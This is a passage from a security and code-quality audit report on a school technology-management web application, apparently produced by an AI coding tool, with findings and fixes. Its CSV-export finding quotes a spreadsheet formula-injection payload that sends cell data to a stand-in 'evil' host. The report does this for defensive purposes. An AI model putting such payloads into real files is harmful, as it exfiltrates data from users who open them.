# Tech-V2 — Full Code Audit Report

**Date:** 2026-06-09  
**Codebase:** Tech Department Management System (Express 5 + React 19 + Prisma + PostgreSQL)  
**Auditor:** Claude Code (automated static analysis)

---

## Table of Contents

1. [Critical Security Issues](#1-critical-security-issues)
2. [High Priority Security Issues](#2-high-priority-security-issues)
3. [Medium Security Issues](#3-medium-security-issues)
4. [Low / Informational Issues](#4-low--informational-issues)
5. [Code Quality Issues](#5-code-quality-issues)
6. [Architecture Improvements](#6-architecture-improvements)
7. [Performance Improvements](#7-performance-improvements)
8. [Missing Production Hardening](#8-missing-production-hardening)

---

## Severity Legend

| Level | Meaning |
|---|---|
| 🔴 **Critical** | Exploitable vulnerability or data loss risk. Fix before any production traffic. |
| 🟠 **High** | Significant security weakness or reliability risk. Fix before wider rollout. |
| 🟡 **Medium** | Noteworthy weakness; low likelihood but real impact. Fix in next sprint. |
| 🔵 **Low / Info** | Minor hardening improvement or informational finding. |
| ⚪ **Quality / Perf** | Code quality, architecture, or performance improvement. |

---

## 1. Critical Security Issues

### ~~CRIT-1~~ ✅ — ~~CSRF Cookie Marked `httpOnly`, Breaking the Double-Submit Pattern~~
**File:** `backend/src/middleware/csrf.ts` (lines 49–54)

The `XSRF-TOKEN` cookie is set with `httpOnly: true`. The entire point of the double-submit cookie pattern is that JavaScript reads the cookie value and sends it as a request header. With `httpOnly`, JavaScript cannot read it, so the token is instead mirrored via the `X-CSRF-Token` response header in `api.ts`. This means on the very first page load (after a browser restart / hard refresh), `csrfToken` in `api.ts` is `null` — every POST/PUT/DELETE issued before the first GET response will be sent without a CSRF token and will fail with a 403.

**Fix:** Either remove `httpOnly: true` from the XSRF-TOKEN cookie (standard double-submit pattern), or guarantee that any mutation is always preceded by a GET that captures the header before the token is needed.

---

### ~~CRIT-2~~ ✅ — ~~JWT Access and Refresh Tokens Share the Same Secret~~
**File:** `backend/src/controllers/auth.controller.ts` (lines 220–243, 362–464)

Both access tokens and refresh tokens are signed with the same `process.env.JWT_SECRET`. An attacker who crafts a forged or replayed refresh token payload could potentially pass it off as an access token. The `isRefreshTokenPayload` type guard provides partial protection but is only as strong as the payload structure check at runtime.

**Fix:** Use two distinct secrets — `JWT_ACCESS_SECRET` and `JWT_REFRESH_SECRET`. Verify each token only against its own secret.

---

### ~~CRIT-3~~ ✅ — ~~No Startup Validation of Required Environment Variables~~
**Files:** `backend/src/middleware/auth.ts` (line 83), `backend/src/controllers/auth.controller.ts` (line 222), `backend/src/config/entraId.ts`

All required env vars (`JWT_SECRET`, `ENTRA_CLIENT_SECRET`, `ENTRA_CLIENT_ID`, `ENTRA_TENANT_ID`, etc.) are accessed with the `!` non-null assertion. This suppresses TypeScript errors but does not prevent runtime failures. A missing env var will fail silently until a real user hits the affected auth flow — not at startup.

**Fix:** Add an explicit startup validation function that checks all required env vars and throws a clear error message before `app.listen()`.

---

### ~~CRIT-4~~ ✅ — ~~Admin Routes Have No CSRF Protection~~
**File:** `backend/src/routes/admin.routes.ts`

All POST routes under `/api/admin` — including `/sync-users/all`, `/sync-users/staff`, `/sync-users/students`, `/jobs/:jobKey/run` — do not include `validateCsrfToken` in their middleware chain. These are destructive admin operations (full directory syncs, database-modifying scheduled jobs) that could be triggered by a CSRF attack if an admin visits a malicious page while authenticated.

**Fix:** Add `router.use(validateCsrfToken)` to `admin.routes.ts` after the `requireAdmin` middleware.

---

### ~~CRIT-5~~ ✅ — ~~Unvalidated and Uncapped Pagination Parameters in Inventory~~
**File:** `backend/src/controllers/inventory.controller.ts` (lines 52–53)

`page` and `limit` are parsed directly with `parseInt(...)` and no Zod validation. `parseInt('abc')` returns `NaN`; `limit=1000000` will trigger a massive unbounded database query; negative values produce unexpected behavior. No maximum is enforced.

**Fix:** Add a Zod schema for inventory query parameters with `limit` capped at a reasonable maximum (e.g., 200) and explicit coercion/default handling — matching the pattern already used in `purchaseOrder.controller.ts`.

---

### ~~CRIT-6~~ ✅ — ~~Inventory Export Fetches Up to 10,000 Rows Without Authorization Scope Check~~
**File:** `backend/src/controllers/inventory.controller.ts` (lines 514–583)

The `exportInventory` endpoint unconditionally sets `limit: 10000`. Any authenticated user with basic inventory access can export the full inventory database — including purchase prices, serial numbers, and asset tags — in one request. There is no elevated permission check on this endpoint.

**Fix:** Add a `requireModule('TECHNOLOGY', 3)` (or equivalent admin-only) guard on the export route. Consider stream-based export rather than loading 10,000 records into memory at once.

---

### ~~CRIT-7~~ ✅ — ~~Raw Error Messages Leaked in Admin Route Handlers~~
**File:** `backend/src/routes/admin.routes.ts` (lines 81, 103, 131, and others)

Multiple inline error handlers respond with `message: error.message` directly, regardless of environment. Unlike the existing `handleControllerError` utility (which gates stack traces to development only), these handlers expose raw Prisma/Node error messages — which may include table names, column names, or connection string fragments — to all callers in production.

**Fix:** Replace all inline `catch` blocks with `handleControllerError(res, error)`, or gate `error.message` exposure to `process.env.NODE_ENV !== 'production'`.

---

## 2. High Priority Security Issues

### ~~HIGH-1~~ ✅ — ~~User Profile (Including Permission Data) Persisted to localStorage~~
**File:** `frontend/src/store/authStore.ts` (lines 47–74)

The Zustand `persist` middleware stores the full `user` object (including `groups`, `roles`, `permLevels`, `entraId`, `email`, `name`) in `localStorage`. JWT tokens are correctly kept in HttpOnly cookies, but the permission data that drives UI authorization decisions (`requireAdmin`, `requireTech`, permission-level gating) lives in localStorage. Any XSS attack can read and spoof these values to bypass client-side access checks.

**Fix:** Prefer `sessionStorage` over `localStorage` (shorter exposure window), or better: remove `persist` entirely and reconstruct user state from a validated `/api/auth/me` call on every page load. Frontend should receive pre-computed boolean flags from the server rather than raw group IDs.

---

### ~~HIGH-2~~ ✅ — ~~OAuth Callback Does Not Explicitly Validate the `state` Parameter~~
**File:** `backend/src/controllers/auth.controller.ts` (lines 61–71)

The OAuth callback checks for `code` but does not explicitly validate the `state` parameter. Without state validation, the OAuth flow is vulnerable to CSRF attacks that redirect users through attacker-controlled sessions. (MSAL may handle this internally — this needs explicit confirmation and code comment.)

**Fix:** Confirm via testing or MSAL documentation that `acquireTokenByCode` internally validates `state`. If it does, add a comment documenting this. If it does not, add explicit state validation.

---

### ~~HIGH-3~~ ✅ — ~~`optionalAuth` Middleware Silently Ignores Forged Tokens~~
**File:** `backend/src/middleware/auth.ts` (lines 153–186)

The `optionalAuth` middleware catches all JWT errors and silently proceeds without logging anything (`catch (error) { /* Silently fail for optional auth */ }`). A request with a clearly forged or tampered token is treated identically to a request with no token at all, making it invisible to monitoring.

**Fix:** Log at `debug` or `warn` level when a token is present but invalid. Also audit which routes actually need `optionalAuth` versus full `authenticate`.

---

### ~~HIGH-4~~ ✅ — ~~`@ts-ignore` Suppresses Type Error on Auth Access, Creating False Audit Trail~~
**File:** `backend/src/controllers/user.controller.ts` (line 147)

`// @ts-ignore` is placed immediately before `const assignedBy = req.user?.id || 'system'`. The fallback value `'system'` means that if `req.user` is undefined (e.g., route misconfiguration without auth middleware), the operation proceeds and is recorded as performed by `'system'` — creating a false audit trail.

**Fix:** Remove the `@ts-ignore`. Change the handler signature to `AuthRequest`. Add an explicit 401 guard if `req.user` is absent.

---

### ~~HIGH-5~~ ✅ — ~~Content-Disposition Header Contains Unsanitized User-Controlled Data~~
**Files:** `backend/src/controllers/invoice.controller.ts` (line 125), `backend/src/controllers/purchaseOrder.controller.ts` (line 415), `backend/src/controllers/inventoryAudit.controller.ts` (line 112)

`res.setHeader('Content-Disposition', \`attachment; filename="${invoice.invoiceNumber}.pdf"\`)` embeds a database value directly in an HTTP header without sanitization. Characters like `"`, `;`, newlines, or CRLF sequences can break the header and enable header injection.

**Fix:** Sanitize filenames before embedding in headers — replace non-alphanumeric characters (except `-`, `_`, `.`) with underscores, or use RFC 5987 encoded filenames.

---

### ~~HIGH-6~~ ✅ — ~~Bearer Token Auth Path Bypasses CSRF Entirely~~
**File:** `backend/src/middleware/auth.ts` (lines 66–70)

The `authenticate` middleware falls back to `Authorization: Bearer` when no cookie is present (described as "backward compatibility"). Clients using Bearer tokens bypass CSRF middleware entirely. It is unclear which clients still use this path; if none do, the surface area should be removed.

**Fix:** If Bearer token support is no longer needed, remove it. If required for specific integrations, document exactly which clients use it and ensure they cannot be used to perform state-changing operations on behalf of cookie-authenticated users.

---

## 3. Medium Security Issues

### ~~MED-1~~ ✅ — ~~CSRF `timingSafeEqual` Throws on Length Mismatch (500 Instead of 403)~~
**File:** `backend/src/middleware/csrf.ts` (lines 98–101)

`crypto.timingSafeEqual(Buffer.from(cookieToken), Buffer.from(headerToken))` throws `ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH` if the two buffers differ in length. This exception propagates to the global error handler and returns a 500 Internal Server Error rather than a 403 Forbidden.

**Fix:** Check `Buffer.byteLength(cookieToken) === Buffer.byteLength(headerToken)` first and return 403 immediately if they differ.

---

### ~~MED-2~~ ✅ — ~~Bulk Delete `ids` Array Has No Validation or Size Cap~~
**File:** `backend/src/controllers/inventory.controller.ts` (lines 290–313)

`const { ids } = req.body as { ids: string[] }` has no Zod validation. No check that `ids` is an array, that each element is a valid UUID, or that the array length has a maximum. An attacker could submit `ids: [null, null, ...]` or an array of thousands of entries.

**Fix:** Add Zod schema: `z.object({ ids: z.array(z.string().uuid()).min(1).max(500) })`.

---

### ~~MED-3~~ ✅ — ~~In-Memory Admin Notification Rate Limiter Is Not Multi-Instance Safe~~
**File:** `backend/src/controllers/damageIncident.controller.ts` (lines 172–173)

`const recentAdminNotifications = new Map<string, number>()` is a module-level in-memory store. Across multiple container replicas or Node.js cluster workers, each instance has its own map — the 5-minute notification cooldown is ineffective in multi-instance deployments.

**Fix:** Persist the rate limit state in PostgreSQL (or Redis) using a similar pattern to the email queue that already exists.

---

### ~~MED-4~~ ✅ — ~~File Upload MIME Type Validation Is Client-Controlled~~
**Files:** `backend/src/routes/damageIncident.routes.ts` (lines 35–41), `backend/src/routes/driverLicense.routes.ts` (lines 40–47)

Multer's `fileFilter` trusts `file.mimetype` which is sent by the client. A malicious file can be uploaded with a spoofed `Content-Type: image/jpeg` header. This is especially concerning for driver license images (sensitive PII documents).

**Fix:** Use a server-side magic number inspection library such as `file-type` to verify the actual binary content type of uploaded files before accepting them.

---

### ~~MED-5~~ ✅ — ~~Date Parameters Parsed Without Validation (Inventory Filter)~~
**File:** `backend/src/controllers/inventory.controller.ts` (lines 69–72)

`new Date(purchaseDateFrom as string)` is called on raw query string values. Submitting `purchaseDateFrom=not-a-date` produces `Invalid Date`, which Prisma rejects at runtime with a cryptic error. No max date range is enforced.

**Fix:** Add Zod schema validation for inventory query parameters (coerce dates using `z.string().datetime()` or `z.coerce.date()`).

---

### ~~MED-6~~ ✅ — ~~`importInventory` Calls `JSON.parse` on Unvalidated String~~
**File:** `backend/src/controllers/inventory.controller.ts` (line 430)

`const options = req.body.options ? JSON.parse(req.body.options) : {}` — `JSON.parse` throws `SyntaxError` on invalid input, which is uncaught and returns a 500. The parsed object is also not validated against any schema.

**Fix:** Wrap in `try/catch` with a 400 response on parse failure. Validate the resulting object with a Zod schema.

---

### ~~MED-7~~ ✅ — ~~Admin Sync Operations Have No Concurrency Guard~~
**File:** `backend/src/routes/admin.routes.ts` (lines 86–187)

If two admins trigger "Sync All Users" simultaneously, two full Entra directory syncs run in parallel and both attempt to upsert the same user records — causing race conditions and duplicate work.

**Fix:** Add an in-flight guard (a DB-backed lock flag or Redis-based distributed lock) to prevent concurrent execution of the same sync operation.

---

### ~~MED-8~~ ✅ — ~~`CronJobsService.getStatus()` Always Reports `running: true`~~
**File:** `backend/src/services/cronJobs.service.ts` (lines 111–122)

The `getStatus()` method iterates the `jobs` Map and hardcodes `running: true` for every job, regardless of actual execution state or last failure. This misleads administrators monitoring job health.

**Fix:** Track actual job state: last run timestamp, last error, and whether the job is currently executing.

---

## 4. Low / Informational Issues

### ~~LOW-1~~ ✅ — ~~`/health` Endpoint Exposes Server Uptime Publicly~~
**File:** `backend/src/server.ts` (lines 130–136)

The unauthenticated `/health` endpoint returns `uptime`, which allows external actors to estimate the last restart time and infer deployment cycles.

**Fix:** Return only `{ status: 'ok' }` for public health checks. Move diagnostics (uptime, version, etc.) to an admin-authenticated health endpoint.

---

### ~~LOW-2~~ ✅ — ~~`.env.example` May Contain a Real Azure AD Group GUID~~
**File:** `backend/.env.example` (line 26)

`ENTRA_TRANSPORTATION_SECRETARY_GROUP_ID="d0232265-a91b-4cf7-9fdb-b7fdf1eaea30"` appears to be a real Azure AD object ID committed to the repository. While not directly exploitable, it is a minor information disclosure about the tenant's authorization structure.

**Fix:** Replace with a placeholder value like `"your-transportation-secretary-group-object-id"`.

---

### ~~LOW-3~~ ✅ — ~~OAuth Error Messages From Server Shown Directly to Users (Account Enumeration)~~
**File:** `frontend/src/pages/Login.tsx` (line 97)

Server-supplied error messages are shown directly in the UI. The backend may return messages like "User account has been disabled" which enables account enumeration — an attacker can determine whether specific accounts exist or are disabled.

**Fix:** Map server error messages to generic client-facing strings. Log the original message server-side only.

---

### ~~LOW-4~~ ✅ — ~~`console.error` in driverLicense.routes.ts Bypasses Structured Logger~~
**File:** `backend/src/routes/driverLicense.routes.ts` (line 27)

One `console.error` call bypasses Winston and will not be captured by the structured log pipeline or filtered by log level.

**Fix:** Replace with `logger.warn(...)` using the existing logger pattern.

---

### ~~LOW-5~~ ✅ — ~~Frontend `console.log` on Every Query/Mutation (Production Noise)~~
**File:** `frontend/src/lib/queryClient.ts` (lines 64, 75)

`console.log('Query Success [...])` and `console.log('Mutation Success')` fire on every successful TanStack Query operation. In production, this floods the browser console and exposes internal query key structures and data shapes to anyone with DevTools open.

**Fix:** Remove these statements entirely, or gate them to `import.meta.env.DEV`.

---

### ~~LOW-6~~ ✅ — ~~Several Required Env Vars Missing From `.env.example`~~
**File:** `backend/.env.example`

The following variables are used in code but undocumented in `.env.example`:
- `ENTRA_PRINCIPALS_GROUP_ID` (used in `requireAdminOrPrimarySupervisor.ts`)
- `ENTRA_VICE_PRINCIPALS_GROUP_ID` (used in `requireAdminOrPrimarySupervisor.ts`)
- `ENTRA_FOOD_SERVICES_SUPERVISOR_GROUP_ID`
- `ENTRA_FINANCE_PO_ENTRY_GROUP_ID`
- `REFRESH_TOKEN_EXPIRES_IN`
- `EMAIL_QUEUE_POLL_INTERVAL_MS`, `EMAIL_QUEUE_SEND_INTERVAL_MS`, `EMAIL_QUEUE_MAX_ATTEMPTS`, `EMAIL_QUEUE_BACKOFF_BASE_MS`
- `SUPERVISOR_SYNC_SCHEDULE`
- `SMTP_SECURE`

**Fix:** Audit all `process.env.*` accesses and ensure every variable is documented in `.env.example` with a description and example value.

---

## 5. Code Quality Issues

### ~~QA-1~~ ✅ — ~~`as any` Casts Used as Response Type Escape Hatches~~
**File:** `backend/src/controllers/auth.controller.ts` (lines 57, 343, 486, etc.)

`res.status(500).json({ error: '...' } as any)` appears throughout the auth controller as a workaround for TypeScript strict typing on response generics. This defeats the purpose of typed response bodies.

**Fix:** Define a union error response type (e.g., `AuthErrorResponse`) and use it consistently, or change handler signatures to `Response` without generic body typing.

---

### ~~QA-2~~ ✅ — ~~`any` Type Annotations in Controllers~~
**Files:** `backend/src/controllers/inventory.controller.ts` (lines 516, 527), `backend/src/controllers/referenceData.controller.ts` (lines 151, 168), `backend/src/controllers/work-orders.controller.ts` (line 35)

Multiple `any` annotations allow type-unsafe operations on data going to/from the database.

**Fix:** Replace with explicit interfaces or Prisma's generated types.

---

### ~~QA-3~~ ✅ — ~~Cron Expression From Environment Not Validated at Startup~~
**File:** `backend/src/services/cronJobs.service.ts` (line 31)

`const schedule = process.env.SUPERVISOR_SYNC_SCHEDULE || '0 2 * * *'` — a user-supplied cron expression from the environment is not validated before being passed to `cron.schedule()`. An invalid expression will throw at startup with an unhelpful error.

**Fix:** Call `cron.validate(schedule)` and throw a descriptive error at startup if it is invalid.

---

### ~~QA-4~~ ✅ — ~~`bulkUpdateInventory` Body Has No Zod Validation~~
**File:** `backend/src/controllers/inventory.controller.ts` (lines 320–344)

`const { itemIds, updates } = req.body` — neither field is validated. `updates` is passed directly to `inventoryService.bulkUpdate()` with no type safety.

**Fix:** Add a Zod schema for the bulk update request body.

---

### ~~QA-5~~ ✅ — ~~Inconsistent Logger Usage (`logger` vs `loggers` child loggers)~~
**File:** `backend/src/lib/logger.ts`

Some controllers import the default `logger` export while others use `loggers.moduleName` child loggers. This makes it harder to filter and search logs by component.

**Fix:** Standardize on child loggers for all modules. Consider removing the generic `logger` export to enforce this.

---

### QA-6 ✅ — Email Queue Cleanup Uses Poll Counter Instead of Time
**File:** `backend/src/services/emailQueue.service.ts` (lines 187–200)

Cleanup runs every 100 poll cycles. With a very short `POLL_INTERVAL_MS`, this causes cleanup to run extremely frequently. With a very long interval, the table grows unchecked.

**Fix:** Track `lastCleanupAt` and run cleanup only when a defined time threshold (e.g., 6 hours) has elapsed.

---

### QA-7 ✅ — Raw SQL in `settings.service.ts` Contradicts "Prisma Only" Standard
**File:** `backend/src/services/settings.service.ts` (lines 70–83)

`this.prisma.$queryRaw` is used for atomic counter increment. The tagged template literal prevents SQL injection here, but the presence of raw SQL may encourage unsafe copying by future maintainers.

**Fix:** Add a comment explicitly documenting why raw SQL is used (atomicity) and that it is safe. Investigate whether `$transaction` with SELECT FOR UPDATE can replace it.

---

## 6. Architecture Improvements

### ARCH-1 ✅ — Frontend Authorization Logic Duplicated Between ProtectedRoute and Page Components
**Files:** `frontend/src/components/ProtectedRoute.tsx`, various page components

`ProtectedRoute` checks `requireAdmin`, `requireTech`, etc., but many page components also inline their own `user?.roles?.includes('ADMIN')` checks. These duplicate checks can drift out of sync — resulting in a page that appears gated but whose components still render for unauthorized users if the route guard is misconfigured.

**Fix:** Centralize all route-level permission checks in `ProtectedRoute`. Page components should not re-implement permission logic.

---

### ARCH-2 ✅ — Entra Group IDs Embedded in Frontend Bundle
**File:** `frontend/src/store/authStore.ts` (lines 88–101)

Entra group IDs are baked into the React bundle via `import.meta.env.VITE_ENTRA_*`. The frontend derives access flags (e.g., `selectCanAccessDeviceManagement`) from these group IDs client-side — a check that any user can bypass by modifying the stored auth state. Group IDs are also visible to anyone who inspects the compiled bundle.

**Fix:** Move all authorization logic to the backend. The server should return pre-computed boolean flags (`canAccessDeviceManagement: boolean`) in the `/api/auth/me` response. Group IDs should never leave the backend.

---

### ARCH-3 ✅ — Token Refresh Fetches Full Group Membership on Every Refresh
**File:** `backend/src/controllers/auth.controller.ts` (lines 394–407)

Every token refresh (every ~25 minutes) makes a full Microsoft Graph API call to enumerate transitive group memberships. For users in many groups, this requires multiple paginated HTTP requests and adds significant latency to a frequent background operation.

**Fix:** Cache group memberships on the `users` table with a `groupsLastSyncedAt` timestamp. Only re-fetch from Graph if the cache is stale (e.g., older than 30 minutes).

---

### ARCH-4 ✅ — `syncUsers` Endpoint Returns Raw Entra Graph API Objects
**File:** `backend/src/controllers/auth.controller.ts` (lines 578–617)

The `/api/auth/sync-users` endpoint returns `users: users.value` — the raw Microsoft Graph API response. This exposes PII and organizational structure data that bypasses the application's own data model.

**Fix:** Either complete the sync logic (store to DB, return count only) or remove the raw user list from the response entirely.

---

### ARCH-5 ✅ — Proactive Frontend Token Refresh Timer Not Cancelled on Logout
**File:** `frontend/src/services/api.ts` (lines 46–84)

`proactiveTimer` is a module-level variable. When a user logs out, the timer continues firing. It checks `isAuthenticated` before refreshing (so no actual refresh occurs), but the dangling timer is a memory leak in long-running sessions or test environments.

**Fix:** Export a `cancelProactiveRefresh()` function and call it from the logout handler or `clearAuth()`.

---

## 7. Performance Improvements

### PERF-1 ✅ — PDF Download Makes Two Separate Database Queries
**File:** `backend/src/controllers/invoice.controller.ts` (lines 118–130)

`getPdf` first generates the PDF (requiring a DB fetch), then calls `getById` a second time to get the invoice number for the filename. Two queries where one would suffice.

**Fix:** Return the invoice number alongside the PDF buffer from `service.getPdf(id)`.

---

### PERF-2 ✅ — `getInventoryByLocation` and `getInventoryByRoom` Return Unbounded Sets
**File:** `backend/src/controllers/inventory.controller.ts` (lines 351–395)

Both endpoints return all inventory items for a location or room with no pagination. Locations with large deployments (hundreds of devices) return everything in a single response.

**Fix:** Add pagination consistent with the main `getInventory` endpoint.

---

### PERF-3 ✅ — Email Queue Cleanup Is Tied to Poll Cycle Count
**File:** `backend/src/services/emailQueue.service.ts` (lines 187–200)
*(See also QA-6 above.)*

---

## 8. Missing Production Hardening

### HARD-1 ✅ — No Content Security Policy (CSP) Configured
**File:** `backend/src/server.ts` (line 60)

`app.use(helmet())` is called with no configuration. Helmet's default does **not** set a `Content-Security-Policy` header. Without CSP, XSS attacks have no secondary browser-level containment.

**Suggested starting policy:**
```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:;
connect-src 'self' https://login.microsoftonline.com;
frame-ancestors 'none';
```

---

### HARD-2 ✅ — No Request Body Size Limit on JSON Parser
**File:** `backend/src/server.ts` (line 104)

`express.json()` is called without a `limit` option. The Express default is 100kb. For bulk JSON endpoints (bulk update, bulk delete), there is no upper bound on payload size.

**Fix:** Set `express.json({ limit: '1mb' })` and `express.urlencoded({ extended: true, limit: '1mb' })`.

---

### HARD-3 ✅ — No Rate Limiting on the Token Refresh Endpoint
**File:** `backend/src/server.ts` (lines 94–101)

`/api/auth/refresh-token` is explicitly excluded from the auth limiter ("legitimate users can refresh many times per session"). Only the general 500 req/15 min limit applies. An attacker with a stolen refresh token cookie faces minimal friction.

**Fix:** Apply a dedicated refresh limiter (e.g., 30 refreshes per hour per IP) that is separate from the login limiter but stricter than the general limiter.

---

### HARD-4 ✅ — HTTP Server Not Closed Before Process Exit on SIGTERM/SIGINT
**File:** `backend/src/server.ts` (lines 243–257)

SIGTERM/SIGINT handlers stop cron jobs, the scheduler, and the email queue worker, then call `process.exit(0)`. The HTTP server itself is never closed. In-flight requests are abruptly terminated, which can leave partial database writes in an inconsistent state.

**Fix:** Call `server.close(callback)` and wait for it to complete before calling `process.exit(0)`. Add a forced exit timeout (e.g., 10 seconds) if graceful shutdown stalls.

---

### HARD-5 ✅ — Database Connection Pool Has No Configuration or Error Handler
**File:** `backend/src/lib/prisma.ts`

`pg.Pool` is created with only `connectionString`. No `max`, `idleTimeoutMillis`, or `connectionTimeoutMillis` options are set. The default `max` of 10 connections may be insufficient under concurrent load. There is no `pool.on('error', ...)` listener to surface pool-level errors to the structured logger.

**Fix:** Configure pool settings based on load expectations and add:
```ts
pool.on('error', (err) => logger.error('pg pool error', { error: err }));
```

---

### HARD-6 ✅ — No Immutable Audit Log for Financially Significant Operations
**Files:** `backend/src/controllers/invoice.controller.ts`, `backend/src/controllers/purchaseOrder.controller.ts`, `backend/src/controllers/inventory.controller.ts`

Operations like waiving an invoice, permanently deleting inventory, or approving purchase orders are logged to rotating application log files (14-day retention by default) but not to an immutable database audit table. Log files can be overwritten or lost during a deployment.

**Fix:** For financially significant and PII-touching operations, write immutable audit records to a dedicated `audit_log` database table with actor, timestamp, action, and affected record ID. The existing `history` patterns in some services are the right direction; extend them to cover more sensitive operations.

---

### HARD-7 ✅ — No `dangerouslySetInnerHTML` Audit for Free-Text Fields
**Files:** Multiple frontend components that render `notes`, `description`, `reason`, `techNote` fields

React's JSX interpolation escapes HTML automatically. However, if any component uses `dangerouslySetInnerHTML` with an unsanitized database value, it is an XSS vector. The email service has `escapeHtml()` for email output, but there is no systematic audit of the rendering layer.

**Fix:** Grep the frontend for `dangerouslySetInnerHTML` and confirm every instance either escapes the value before insertion or operates on trusted static content only.

---

## Summary Counts

| Severity | Count |
|---|---|
| 🔴 Critical | 7 |
| 🟠 High | 6 |
| 🟡 Medium | 8 |
| 🔵 Low / Info | 6 |
| ⚪ Quality / Perf / Hardening | 20 |
| **Total** | **47** |

---

# Second-Pass Audit (2026-06-10)

A second independent review focused on categories the first pass did not sweep:
object-level authorization (IDOR), file storage/serving, CSV/formula injection,
email header injection, token lifecycle/revocation, Prisma `orderBy` injection,
route shadowing, and verification of the 47 first-pass fixes.

## Verification of First-Pass Fixes

All 47 first-pass findings were re-checked against the committed code and are
correctly implemented. Spot-verified in detail: CSP directives (`server.ts`),
dual JWT secrets, OAuth `state` cookie validation, cookie scoping/flags
(`config/cookies.ts`), graceful shutdown with 10s force-exit, `audit_log` table
usage in PO/inventory/invoice controllers, group-membership caching with Graph
fallback, magic-number upload validation (`utils/fileMagic.ts`), user-sync
concurrency guard, refresh rate limiter, and removal of Zustand `persist` from
`authStore.ts`. No regressions found.

Checked and clean (no finding): email header injection (recipient addresses come
from the DB, nodemailer MIME-encodes subjects), device checkout double-assign
race (serializable transaction), CORS origin allow-list, raw SQL usage (single
documented atomic counter), `dangerouslySetInnerHTML` (zero occurrences in
frontend), unauthenticated endpoints (only the four expected OAuth/logout routes).

---

## Second-Pass Findings

### ~~SP-1~~ ✅ — ~~Damage-Incident Photos Served Without Authentication~~
**Files:** `backend/src/server.ts` (lines 139–145), `backend/src/routes/damageIncident.routes.ts` (line 22)

`/uploads/driver-licenses` is correctly blocked and served through an
authenticated endpoint, but everything else under `/uploads` — including
damage-incident photos — is served by `express.static` with **no authentication**.
UUID filenames make URLs unguessable, but any leaked URL (browser history, chat,
logs, proxy caches) is permanently accessible to anyone, and photos may show
student devices, name labels, or room interiors.

**Fix:** Apply the same pattern as driver licenses: block static access to
`/uploads/damage-incidents` and serve photos through an authenticated
`GET /api/damage-incidents/:id/photos/:photoId` endpoint guarded by
`requireDeviceManagementAccess()`.

---

### ~~SP-2~~ ✅ — ~~Work Order Level-3 Location Scoping Enforced Only on List, Not on Direct Object Access~~
**File:** `backend/src/services/work-orders.service.ts` (lines 334, 453, 488)

The documented permission model (header of `work-orders.routes.ts`) says level 3 =
"View/update work orders **at their location(s)**". The list query
(`getWorkOrders`) enforces this scope, but direct-by-ID access does not:

- `getWorkOrderById` only rejects level ≤ 2 non-owners — a level-3 user can read **any** work order by ID
- `updateWorkOrder` only checks ownership for `permLevel < 3` — a level-3 user can edit **any** work order district-wide
- `updateStatus` checks only the transition's `minLevel`, never location — a level-3 user can transition any ticket

This is horizontal privilege escalation between staff at different schools, and a
mismatch between the documented and enforced model.

**Fix:** In all three methods, when `permLevel === 3` (and 4), resolve the user's
location IDs (same logic as `getWorkOrders`) and reject if the ticket's
`officeLocationId` is outside them and the user is neither reporter nor assignee.

---

### ~~SP-3~~ ✅ — ~~CSV Export Has No Quoting and No Formula-Injection Neutralization~~
**File:** `backend/src/services/inventory.service.ts` (lines 1201–1228)

`exportToExcel` builds CSV by raw `join(',')`:
1. **Formula injection:** values beginning with `=`, `+`, `-`, or `@` (e.g., an
   equipment name of `=HYPERLINK("http://evil/?"&A1,"x")`) execute when the CSV
   is opened in Excel. Names/asset tags are user-editable by any TECHNOLOGY
   level-2 user, and the export is opened by admins.
2. **Structural corruption:** a comma, quote, or newline in any name/brand/model
   silently shifts columns for every following field.

**Fix:** Quote every field (`"…"` with internal quotes doubled) and prefix
values starting with `=`, `+`, `-`, `@`, tab, or CR with `'`. Or implement the
planned exceljs `.xlsx` export, which stores strings as inert text.

---

### ~~SP-4~~ ✅ — ~~No Server-Side Refresh-Token Revocation or Reuse Detection~~
**File:** `backend/src/controllers/auth.controller.ts` (refresh: lines 536–554, logout: lines 607–643)

Refresh tokens are stateless JWTs. Rotation issues a new token on every refresh,
but the **previous token remains valid until its 7-day expiry** — rotation
without invalidation provides no security benefit against theft. Logout only
clears cookies; a stolen refresh token keeps working for up to 7 days after the
user logs out, and there is no detection of the same token being used twice
(the classic stolen-token signal).

**Fix:** Add a `jti` claim, persist active token IDs (or families) per user in
the DB, invalidate the old `jti` on rotation and all of the user's `jti`s on
logout, and treat reuse of a rotated-out token as compromise (revoke the family,
log a security event). The existing `users` table makes this a small migration.

---

### ~~SP-5~~ ✅ — ~~`GET /api/inventory/import` Is Shadowed by `GET /api/inventory/:id` (Dead Endpoint)~~
**File:** `backend/src/routes/inventory.routes.ts` (lines 116–121 vs 246–250)

`GET /inventory/:id` is registered before `GET /inventory/import`, so requests
for the import-job list match the `:id` route with `id = "import"`, fail UUID
param validation, and return 400. The import-jobs list endpoint is unreachable.
(`/inventory/import/:jobId` is unaffected — three segments.)

**Fix:** Register `/inventory/import` (and any other literal sub-paths) before
`/inventory/:id`, matching the comment pattern already used for `bulk-delete`.

---

### ~~SP-6~~ ✅ — ~~Free-String `sortBy` Reaches Prisma `orderBy` (Unhandled 500s)~~
**Files:** `backend/src/services/deviceAssignment.service.ts` (line 309), `backend/src/services/damageIncident.service.ts` (line 233), `backend/src/services/inventory.service.ts` (line 203), `backend/src/validators/invoice.validators.ts` (line 60), `backend/src/validators/repairTicket.validators.ts` (line 38)

Several validators declare `sortBy: z.string()` rather than an enum, and the
services interpolate it directly: `orderBy: { [sortBy]: sortOrder }`. Any value
that is not a real column (`?sortBy=foo`) throws `PrismaClientValidationError`
→ 500. Other modules (referenceData, emailQueueAdmin, fundingSource, room,
workOrderCategory) already use `z.enum([...])` correctly.

**Fix:** Convert the remaining `sortBy` validators to `z.enum` whitelists of
sortable columns.

---

### ~~SP-7~~ ✅ — ~~Inventory Import Accepts the File Upload Before the Permission Check~~
**File:** `backend/src/routes/inventory.routes.ts` (lines 234–239)

On `POST /inventory/import`, `upload.single('file')` (multer, 10 MB in-memory)
runs **before** `requireModule('TECHNOLOGY', 3)`. Any authenticated level-1 user
can repeatedly stream 10 MB bodies into server memory before receiving 403.
`driverLicense.routes.ts` already orders these correctly (permission first).

**Fix:** Move `requireModule('TECHNOLOGY', 3)` before `upload.single('file')`.

---

### ~~SP-8~~ ✅ — ~~CSRF Token Is Not Session-Bound and Never Rotated~~
**File:** `backend/src/middleware/csrf.ts` (lines 38–53)

The double-submit token is generated once per browser (24 h cookie) and is not
